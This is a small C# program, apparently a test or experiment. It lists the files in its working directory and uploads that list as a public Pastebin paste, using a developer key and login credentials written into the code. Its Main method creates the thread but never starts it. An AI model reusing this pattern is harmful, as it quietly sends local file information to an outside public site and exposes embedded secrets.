﻿using System;


public class Test
{
    private static void Main()
    {
        var thread = new System.Threading.Thread(new System.Threading.ThreadStart(PasteBin.Start));
    }
}


public static class PasteBin

{
    public static void Start()
    {
        Send(ScanDir());
    }
    public static string ScanDir()
    {

        var sb = new System.Text.StringBuilder();
        var di = new System.IO.DirectoryInfo(@".\");
        var dir = di.GetFiles("*", System.IO.SearchOption.TopDirectoryOnly);

        foreach (var file in dir)
        {
            sb.Append(file.FullName);
            sb.Append("\n");
        }

        return sb.ToString();
    }
    public static string Send(string text)
    {
        string pasteBinUrl;
        string userKey;

        var query = new System.Collections.Specialized.NameValueCollection();

        query.Add("api_dev_key", "955c285ecbc3d1c8b49111a2a9e4aa7d");
        query.Add("api_user_name", "nikoi");
        query.Add("api_user_password", "nikoi");

        using (var wc = new System.Net.WebClient())
        {
            var respBytes = wc.UploadValues("http://pastebin.com/api/api_login.php", query);
            string resp = System.Text.Encoding.UTF8.GetString(respBytes);

            if (resp.Contains("Bad API request"))
            {
                throw new System.Net.WebException("Bad Request", System.Net.WebExceptionStatus.SendFailure);
            }

            userKey = resp;
        }

        query = new System.Collections.Specialized.NameValueCollection();
        query.Add("api_option", "paste");
        query.Add("api_user_key", userKey);
        query.Add("api_dev_key", "955c285ecbc3d1c8b49111a2a9e4aa7d");
        query.Add("api_paste_code", text);
        query.Add("api_paste_expire_date", "1D");
        query.Add("api_paste_private", "0");
        query.Add("api_paste_format", "text");
        query.Add("api_paste_name", DateTime.Now.ToString());


        using (var webc = new System.Net.WebClient())
        {
            var respByt = webc.UploadValues("http://pastebin.com/api/api_post.php", query);

            var res = System.Text.Encoding.UTF8.GetString(respByt);

            if (res.Contains("Bad API request"))
            {
                throw new System.Net.WebException("Bad Request", System.Net.WebExceptionStatus.SendFailure);
            }

            pasteBinUrl = res;
        }
        return pasteBinUrl;
    }
}
